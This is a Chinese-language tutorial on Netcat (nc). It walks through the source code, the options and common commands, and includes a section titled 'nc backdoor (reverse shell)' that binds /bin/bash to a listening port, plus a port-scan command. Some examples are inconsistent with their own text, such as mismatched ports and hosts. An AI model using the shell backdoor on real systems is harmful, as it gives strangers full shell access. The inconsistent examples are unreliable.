@@ -1,0 +1,354 @@
+# nc 指令的使用与源码解析 - 每周指令
+
+`nc` 的全称为[Netcat](http://netcat.sourceforge.net/), 是一款拥有多种功能的 CLI 工具, 可以在网络上进行读/写以及重定向数据等操作, 被誉为是网络界的瑞士军刀. 它被设计成可以被脚本或其他程序调用的可靠的后端工具. 同时由于它能创建任意所需的连接, 因此它是一个非常好用的网络工具, 它的主要用途为:
+
+- `文件传输`: 由于是直接建立 TCP 连接发送数据流, 因此使用 nc 传输文件是不安全的, 但是速度很快;
+- `端口扫描`: 可用于批量扫描指定 IP 的端口是否可用;
+- `代理服务器`: 简单的代理服务器;
+- 等等;
+
+# 1. 源码解析
+
+- 官方 nc(Netcat) 的代码的下载地址为:http://netcat.sourceforge.net/download.php;
+
+- nc(Netcat) 各版本的代码已经存储到 [bugwz/netcat](https://github.com/bugwz/netcat);
+
+## 1.1 工作模式
+
+nc 共有四种连接模式, 一下列出的连接模式按照索引等级由低到高, 具体模式的含义解释以及相关的结构体代码如下所示:
+
+- `未制定模式`: 默认的模式;
+- `连接模式`: 未使用 `-l` 和 `-L` 参数, 通常为客户端连接其他 IP 的对应端口时启用该模式;
+
+- `监听模式`: 使用 `-l` 参数进入该模式;
+- `隧道模式`: 使用 `-L` 参数进入该模式;
+
+```c
+typedef enum {
+  NETCAT_UNSPEC,
+  NETCAT_CONNECT,
+  NETCAT_LISTEN,
+  NETCAT_TUNNEL
+} nc_mode_t;
+```
+
+## 1.2 支持协议
+
+nc 支持 TCP 和 UDP 协议, 默认支持的协议为 TCP 协议;
+
+```c
+typedef enum {
+  NETCAT_PROTO_UNSPEC,
+  NETCAT_PROTO_TCP,
+  NETCAT_PROTO_UDP
+} nc_proto_t;
+```
+
+## 1.3 主机以及端口存储结构
+
+```c
+/* 这是标准的netcat主机记录. 它包含一个'权威'名称字段,该字段可以为空,
+ * 以及网络符号和点分字符串符号中的IP地址列表.*/
+typedef struct {
+  char name[MAXHOSTNAMELEN];			/* DNS名称 */
+  char addrs[MAXINETADDRS][NETCAT_ADDRSTRLEN];	/* ascii格式的IP地址 */
+  struct in_addr iaddrs[MAXINETADDRS];		/* 真实地址 */
+} nc_host_t;
+
+/* 标准netcat端口记录. 它包含端口名称(可以为空)以及端口号(以数字和字符串形式) */
+typedef struct {
+  char name[NETCAT_MAXPORTNAMELEN];	/* 规范端口名称 */
+  char ascnum[8];			/* ascii端口号 */
+  unsigned short num;			/* 端口号 */
+  /* FIXME:这只是一个测试! */
+  in_port_t netnum;			/* 网络字节顺序的端口号 */
+} nc_port_t;
+
+```
+
+## 1.4 网络连接 Socker 存储结构
+
+```c
+typedef struct {
+  int fd, domain, timeout;
+  nc_proto_t proto;
+  nc_host_t local_host, host;
+  nc_port_t local_port, port;
+  nc_buffer_t sendq, recvq;
+} nc_sock_t;
+```
+
+## 1.5 数据缓存与 IO 读写
+
+数据缓存的结构体如下所示:
+
+```c
+/* 用于队列缓冲和数据跟踪. 'head'字段是指向缓冲区段开始的指针,而'pos'表示数据流的实际位置. 
+ * 如果'head'为NULL,则意味着该缓冲区中没有动态分配的数据,但是它可能仍包含一些本地数据段
+ * (例如,在堆栈内部分配). 'len'表示从'pos'开始的缓冲区的长度.
+ */
+
+typedef struct {
+  unsigned char *head;
+  unsigned char *pos;
+  int len;
+} nc_buffer_t;
+```
+
+网络 IO 的主要的处理函数为 `int core_readwrite(nc_sock_t *nc_main, nc_sock_t *nc_slave)`, 该函数循环操作网络 IO, 相关部分代码如下所示:
+
+```c
+/* 处理标准输入/标准输出/网络IO. */
+int core_readwrite(nc_sock_t *nc_main, nc_sock_t *nc_slave) {
+    int fd_stdin, fd_stdout, fd_sock, fd_max;
+    int read_ret, write_ret;
+    unsigned char buf[1024];
+    bool inloop = TRUE;
+
+		/* IO类型判断等代码省略... */
+
+    while (inloop) {
+        bool call_select = TRUE;
+        struct sockaddr_in recv_addr; /* 仅由UDP协议使用 */
+        unsigned int recv_len = sizeof(recv_addr);
+
+        /* 终端信号处理及io队列判断等代码省略... */
+
+        /* 出于优化原因,我们为两个接收队列都有一个公共缓冲区,
+         * 因此,现在可以处理数据,因此该缓冲区可用于其他套接字事件. */
+        if (nc_slave->recvq.len > 0) {
+            /* 省略部分代码... */
+            /* 如果远程发送队列为空,则将整个数据块移至此处 */
+            if (rem_sendq->len == 0) {
+                /* 省略部分代码... */
+            } else if (!my_recvq->head) {
+                /* 将数据块移动到专用的分配空间中 */
+                debug_v(("  reallocating %d data bytes in slave->recvq",
+                         my_recvq->len));
+                my_recvq->head = malloc(my_recvq->len);
+                memcpy(my_recvq->head, my_recvq->pos, my_recvq->len);
+                my_recvq->pos = my_recvq->head;
+            }
+        }
+				
+        /* 从标准输入读取,现在由于与上述相同的原因而处理nc_slave sendq. 
+         * 可能会有一个公共缓冲区在队列中移动,因此,如果是这种情况,请对其
+         * 进行处理,以便可以重复使用.如果必须延迟更多时间,请将其复制到
+         * 动态分配的空间中. */
+        if (nc_main->sendq.len > 0) {
+            /* 省略部分代码... */
+            write_ret = write(fd_sock, data, data_len);
+            if (write_ret < 0) {
+                if (errno == EAGAIN)
+                    write_ret = 0; /* 写会阻塞,将其附加以选择 */
+                else {
+                    perror("write(net)");
+                    exit(EXIT_FAILURE);
+                }
+            }
+
+        }
+
+        /* 从套接字(网络)读取 */
+        if (call_select && FD_ISSET(fd_sock, &ins)) {
+            if ((nc_main->proto == NETCAT_PROTO_UDP) && opt_zero) {
+                memset(&recv_addr, 0, sizeof(recv_addr));
+                /* 这使我们能够从不同的地址获取数据包 */
+                read_ret = recvfrom(fd_sock, buf, sizeof(buf), 0,
+                                    (struct sockaddr *)&recv_addr, &recv_len);
+                /* 当recvfrom()调用失败时,recv_addr保持不变 */
+                debug_dv(("recvfrom(net) = %d (address=%s:%d)", read_ret,
+                          netcat_inet_ntop(&recv_addr.sin_addr),
+                          ntohs(recv_addr.sin_port)));
+            } else {
+                /* 通用文件读取回退 */
+                read_ret = read(fd_sock, buf, sizeof(buf));
+                debug_dv(("read(net) = %d", read_ret));
+            }
+
+            /* 省略部分代码... */
+        }
+
+        /* 处理网络接收队列 */
+        if (nc_main->recvq.len > 0) {
+            nc_buffer_t *my_recvq = &nc_main->recvq;
+            nc_buffer_t *rem_sendq = &nc_slave->sendq;
+
+            /* 检查telnet代码(如果启用).
+             * 请注意,缓冲的输出间隔不适用于telnet代码答案 */
+            if (opt_telnet) netcat_telnet_parse(nc_main);
+
+            /* telnet解析可能返回0个字符! */
+            if (my_recvq->len > 0) {
+                /* 如果远程发送队列为空,则将整个数据块移至此处 */
+                if (rem_sendq->len == 0) {
+                    memcpy(rem_sendq, my_recvq, sizeof(*rem_sendq));
+                    memset(my_recvq, 0, sizeof(*my_recvq));
+                } else if (!my_recvq->head) {
+                    /* 将数据块移动到专用的分配空间中 */
+                    my_recvq->head = malloc(my_recvq->len);
+                    memcpy(my_recvq->head, my_recvq->pos, my_recvq->len);
+                    my_recvq->pos = my_recvq->head;
+                }
+            }
+        }
+        /* 省略部分代码... */
+
+    }
+
+    /* 我们从网上得到了EOF,请关闭 */
+    shutdown(fd_sock, SHUT_RDWR);
+    close(fd_sock);
+    nc_main->fd = -1;
+
+    /* 仅在不是模拟时才关闭从属套接字 */
+    if (nc_slave->domain != PF_UNSPEC) {
+        shutdown(fd_stdin, SHUT_RDWR);
+        close(fd_stdin);
+        nc_slave->fd = -1;
+    }
+
+    /* 恢复外部信号处理程序 */
+    signal_handler = TRUE;
+
+    return 0;
+} /* core_readwrite()的结尾 */
+```
+
+# 2. 参数解析
+
+```
+usage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]
+	  [-s source_ip_address] [-w timeout] [-X proxy_version]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+```
+
+- `-4`: 使用 IPv4;
+- `-6`: 使用 IPv6;
+- `-A`: 在套接字上设置 SO_RECV_ANYIF;
+- `-a`: 在套接字上设置 SO_AWDL_UNRESTRICTED;
+- `-b`: 将套接字绑定到指定的接口, 需要附带参数;
+- `-c`: 发送 CRLF 作为行尾;
+- `-C`: 不要使用蜂窝数据连接? ? ?
+- `-D`: 启用调试套接字选项;
+- `-d`: 后台运行;
+- `-E`: Don't use expensive interfaces;
+- `-F`: Do not use flow advisory (flow adv enabled by default);
+- `-G`: 连接超时时间 (秒)
+- `-h`: 显示帮助
+- `-H`: 初始化空闲超时时间 (秒), 需要附带参数;
+- `-I`: 重复空闲超时的间隔 (秒), 需要附带参数;
+- `-i`: 发送线路, 扫描端口的延迟间隔, 需要附带参数;
+- `-J`: 重复空闲超时的次数, 需要附带参数;
+- `-k`: 为多个连接保持入站套接字打开;
+- `-K`: 指定流量类别, 需要附带参数;
+- `-l`: 侦听模式, 用于入站连接;
+- `-L`: 生成读取超时事件之前要发送的探测数, 需要附带参数;
+- `-m`: 在套接字上设置 SO_INTCOPROC_ALLOW;
+- `-n`: 禁止名称/端口解析;
+- `-M`: 使用 MULTIPATH 域套接字;
+- `-N`: 生成写超时事件之前要发送的探测数, 需要附带参数;
+- `-O`: 使用老式的 connect 代替 connectx;
+- `-p`: 指定用于远程连接的本地端口 (不能与-l 一起使用), 需要指定参数;
+- `-r`: 随机化远程端口;
+- `-s`: 本地源地址, 需要附带参数;
+- `-t`: 回复 Telnet 请求;
+- `-U`: 使用 Unix 域套接字
+- `-u`: UDP 模式;
+- `-v`: 详细信息模式;
+- `-w`: 连接和最终网络读取超时, 需要附带参数;
+- `-X`: 代理协议, 可选参数为 socks4, socks5 或 connect;
+- `-x`: 指定代理地址和端口;
+- `-z`: 零 I/O 模式 [用于扫描];
+- `-o`: 连接/绑定后发出套接字选项;
+- `--apple-delegate-pid`: 使用 pid 将 socket 设置为委托;
+
+# 3. 常用指令
+
+## 3.1 文件传输
+
+接收数据的机器:
+
+```bash
+nc -4l 54321 > recv.file
+```
+
+发送数据的机器:
+
+```bash
+nc 192.168.1.100 54321 < send.file
+```
+
+## 3.2 端口连通性检测
+
+```bash
+# 可使用 -u 检测UDP端口
+nc -v 192.168.1.100 54321
+```
+
+## 3.3 连接端口
+
+```bash
+# 可使用 -u 连接UDP端口
+nc -4l 192.168.1.100 54321
+```
+
+## 3.4 聊天室
+
+服务器端:
+
+```bash
+nc -4l 54321
+```
+
+客户端:
+
+```bash
+nc 192.168.1.100 54321
+```
+
+## 3.5 代理服务器
+
+目前有三台机器 A(`192.168.1.100`), B(`192.168.1.101`), C(`192.168.1.102`), 现在需要把 `B` 当作代理服务器, 把发送到 `B` 的 `80` 端口的流量全部转发到 `C` 的 `8080` 端口, 确保 `C` 的 `8080` 端口处于监听状态, 执行步骤如下:
+
+### 3.5.1 单向管道
+
+- 在 B 上执行如下指令:
+
+  ```bash
+  nc -l 80 | nc 192.168.1.102 8080
+  ```
+
+### 3.5.2 双向管道
+
+- 在 B 上执行如下指令:
+
+  ```bash
+  mkfifo 2way
+  nc -4l 80 0<2way | nc 192.168.1.100 8080 1>2way
+  
+  ```
+
+## 3.6 nc 后门 (反弹 Shell)
+
+服务器端创建后门的命令: -e` 标志将一个 bash 与端口 10000 相连. 现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限:
+
+```bash
+nc -4l 54321 -e /bin/bash
+
+```
+
+客户端连接后即可执行正常的 Shell 指令, 连接指令如下:
+
+```bash
+nc 192.168.1.100 54321
+
+```
+
+## 3.7 扫描端口
+
+扫描目标 IP 的制定的端口范围;
+
+```bash
+nc -v -z -n -w 1 192.168.1.100 1-1023
+```
